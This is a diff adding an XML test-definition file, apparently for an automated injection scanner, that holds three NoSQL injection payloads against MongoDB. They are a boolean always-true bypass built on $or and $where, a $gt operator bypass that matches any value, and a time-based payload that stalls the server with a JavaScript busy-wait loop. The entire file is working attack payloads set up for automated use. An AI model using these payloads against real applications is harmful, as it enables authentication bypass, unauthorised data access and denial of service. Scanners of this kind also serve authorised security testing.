@@ -1,0 +1,51 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+    <!-- NoSQL Injection Tests (MongoDB, CouchDB bypasses) -->
+    <test>
+        <title>MongoDB Boolean-Based (Always True)</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>3</where>
+        <vector>{"$or": [{"[ORIGKEY]": "[ORIGVALUE]"}, {"$where": "this._id !== '[RANDSTR]'"} ] }</vector>
+        <request>
+            <payload>{"$or": [{"[ORIGKEY]": "[ORIGVALUE]"}, {"$where": "this._id !== '[RANDSTR]'"} ] }</payload>
+        </request>
+        <response>
+            <comparison>{"$or": [{"[ORIGKEY]": "[ORIGVALUE]"}, {"$where": "this._id === '[RANDSTR]'"} ] }</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>MongoDB Operator Bypass ($gt)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>3</where>
+        <vector>{"[ORIGKEY]": {"$gt": ""}}</vector>
+        <request>
+            <payload>{"[ORIGKEY]": {"$gt": ""}}</payload>
+        </request>
+        <response>
+            <comparison>{"[ORIGKEY]": {"$in": []}}</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>MongoDB Time-Based (Server-Side JS Sleep)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>3</where>
+        <vector>{"$where": "function() { var d = new Date(); while(new Date() - d &lt; [RANDTIME]*1000) {}; return true; }"}</vector>
+        <request>
+            <payload>{"$where": "function() { var d = new Date(); while(new Date() - d &lt; [RANDTIME]*1000) {}; return true; }"}</payload>
+        </request>
+        <response>
+            <time>[RANDTIME]</time>
+        </response>
+    </test>
+</root>
